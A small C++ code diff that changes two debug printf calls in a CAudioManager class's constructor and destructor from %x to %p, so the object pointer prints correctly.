@@ -17,7 +17,7 @@ using namespace std;
 
 CAudioManager::CAudioManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
 {
-	printf("new CAudioManager %x\n", this);
+	printf("new CAudioManager %p\n", this);
 
 	m_bIsWorking = FALSE;
 	m_AudioObject = NULL;
@@ -110,7 +110,7 @@ CAudioManager::~CAudioManager()
 		delete [] szPacket;
 		szPacket = NULL;
 	}
-	printf("~CAudioManager %x\n", this);
+	printf("~CAudioManager %p\n", this);
 }
 
 //USB  
